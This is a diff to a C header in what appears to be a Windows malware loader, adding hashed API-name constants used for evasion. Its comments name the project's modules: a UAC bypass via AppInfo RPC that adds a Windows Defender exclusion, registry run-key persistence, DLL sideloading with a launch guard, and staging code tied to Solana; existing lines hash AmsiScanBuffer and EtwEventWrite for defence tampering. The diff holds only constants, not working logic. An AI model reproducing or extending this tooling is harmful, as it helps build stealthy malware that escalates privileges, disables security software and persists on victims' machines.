@@ -58,6 +58,9 @@
 #define TpPostWork_JOAAT                0xBEF96313
 #define TpReleaseWork_JOAAT             0xBA0F3087
 
+// ----------- Sleep (used for retry delays in Solana.c / Staging.c) -----------
+#define Sleep_JOAAT                     0x8EC35C06  // kernel32!Sleep
+
 // ----------- WinAPI Name Hashes -----------
 #define LoadLibraryA_JOAAT              0xEC33D795
 #define GetProcAddress_JOAAT            0x8F900864
@@ -65,3 +68,35 @@
 #define VirtualProtect_JOAAT            0x69B260D2
 #define EtwEventWrite_JOAAT             0xEF9B6F9B
 #define AmsiScanBuffer_JOAAT            0x725879AF
+
+// ----------- Bind File Discovery (kernel32 exports) -----------
+#define FindFirstFileA_JOAAT            0xBEB8D600
+#define FindNextFileA_JOAAT             0x5D8A9C6B
+#define FindClose_JOAAT                 0x1FF88458
+#define GetCommandLineA_JOAAT           0x14D7236E  // persistence-launch guard in Sideload.c
+
+// ----------- UacBypass.c — AppInfo RPC WD exclusion (kernel32) -----------
+#define CreateEventW_JOAAT              0xC56DE59D
+#define WaitForSingleObject_JOAAT       0x000DEA0A
+#define WaitForDebugEvent_JOAAT         0x529F4D40
+#define ContinueDebugEvent_JOAAT        0x64D063F8
+#define DebugActiveProcessStop_JOAAT    0xA238C74D
+#define TerminateProcess_JOAAT          0x66AFA02A
+#define GetSystemDirectoryW_JOAAT       0xD3A9E702
+#define GetWindowsDirectoryW_JOAAT      0xB8923C5F
+#define GetModuleFileNameW_JOAAT        0x6EEA1E33
+#define CreateProcessW_JOAAT            0xD460721B
+#define InitializeProcThreadAttributeList_JOAAT  0x8F01862A
+#define UpdateProcThreadAttribute_JOAAT          0x0C6CB2A1
+#define DeleteProcThreadAttributeList_JOAAT      0x30A136E9
+
+// ----------- UacBypass.c — AppInfo RPC WD exclusion (ntdll) -----------
+#define NtQueryInformationProcess_JOAAT 0xE873107E
+#define NtRemoveProcessDebug_JOAAT      0x38CC29DE
+#define NtDuplicateObject_JOAAT         0x86426FE8
+#define DbgUiSetThreadDebugObject_JOAAT 0xCF6EB6F6
+
+// ----------- Persist.c — Registry run-key persistence (advapi32) -----------
+#define RegOpenKeyExW_JOAAT             0x769D1396
+#define RegSetValueExW_JOAAT            0x941AFF2B
+#define RegCloseKey_JOAAT               0xFADC2D7D
